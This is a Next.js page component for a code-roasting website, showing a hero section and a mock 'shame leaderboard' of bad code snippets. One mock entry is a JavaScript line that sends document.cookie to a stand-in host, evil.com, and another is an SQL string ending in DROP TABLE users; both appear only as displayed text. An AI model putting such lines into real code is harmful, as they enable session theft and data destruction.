import Link from "next/link"
import { CodeInputForm } from "@/components/ui/code-input-form"
import { LeaderboardRow } from "@/components/ui/leaderboard-row"

const MOCK_LEADERBOARD = [
  {
    rank: 1,
    score: 1.2,
    codePreview:
      "eval(prompt('Enter code')); document.write(fetch('http://evil.com/?d='+document.cookie))",
    language: "JavaScript",
  },
  {
    rank: 2,
    score: 1.8,
    codePreview:
      "if (x == TRUE) { return True; } else if (x == False) { return false; } else { return True; }",
    language: "TypeScript",
  },
  {
    rank: 3,
    score: 2.4,
    codePreview: "SELECT * FROM users WHERE 1=1; DROP TABLE users; -- TODO: add authentication",
    language: "sql",
  },
]

export default function Home() {
  return (
    <main className="pb-20">
      <div className="mx-auto flex max-w-[960px] flex-col items-center gap-32 px-5 pt-20">
        {/* ── hero ── */}
        <section className="flex w-full flex-col items-center gap-8">
          {/* title */}
          <div className="flex flex-col items-center gap-3 text-center">
            <h1 className="flex flex-wrap items-baseline justify-center gap-3 font-bold font-mono text-4xl leading-tight">
              <span className="text-brand">$</span>
              <span className="text-text-primary">paste your code. get roasted.</span>
            </h1>
            <p className="font-['IBM_Plex_Mono',ui-monospace,monospace] text-sm text-text-secondary">
              {"// drop your code below and we'll rate it — brutally honest or full roast mode"}
            </p>
          </div>

          {/* code input */}
          <CodeInputForm />

          {/* footer hint */}
          <div className="flex items-center gap-6">
            <span className="font-['IBM_Plex_Mono',ui-monospace,monospace] text-text-tertiary text-xs">
              2,847 codes roasted
            </span>
            <span className="font-mono text-text-tertiary text-xs">·</span>
            <span className="font-['IBM_Plex_Mono',ui-monospace,monospace] text-text-tertiary text-xs">
              avg score: 4.2/10
            </span>
          </div>
        </section>

        {/* ── leaderboard preview ── */}
        <section className="flex w-full flex-col gap-6">
          {/* section header */}
          <div className="flex flex-col gap-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <span className="font-mono text-brand text-sm">#</span>
                <h2 className="font-medium font-mono text-base text-text-primary">
                  shame_leaderboard
                </h2>
              </div>
              <Link
                href="/leaderboard"
                className="flex items-center gap-1 border border-border px-3 py-1.5 font-mono text-text-secondary text-xs transition-colors hover:border-brand hover:text-brand"
              >
                $ view_all &gt;&gt;
              </Link>
            </div>
            <p className="font-['IBM_Plex_Mono',ui-monospace,monospace] text-[13px] text-text-tertiary">
              {"// the worst code on the internet, ranked by shame"}
            </p>
          </div>

          {/* table */}
          <div className="flex flex-col border border-border">
            {/* table header */}
            <div className="flex items-center gap-6 border-border border-b bg-bg-surface px-5 py-2.5">
              <span className="w-10 shrink-0 font-mono text-text-tertiary text-xs">rank</span>
              <span className="w-15 shrink-0 font-mono text-text-tertiary text-xs">score</span>
              <span className="min-w-0 flex-1 font-mono text-text-tertiary text-xs">code</span>
              <span className="w-25 shrink-0 text-right font-mono text-text-tertiary text-xs">
                lang
              </span>
            </div>

            {/* rows */}
            {MOCK_LEADERBOARD.map((row) => (
              <LeaderboardRow
                key={row.rank}
                rank={row.rank}
                score={row.score}
                codePreview={row.codePreview}
                language={row.language}
              />
            ))}
          </div>

          {/* fade hint */}
          <p className="text-center font-['IBM_Plex_Mono',ui-monospace,monospace] text-text-tertiary text-xs">
            showing top 3 of 2,847 · view full leaderboard &gt;&gt;
          </p>
        </section>
      </div>
    </main>
  )
}
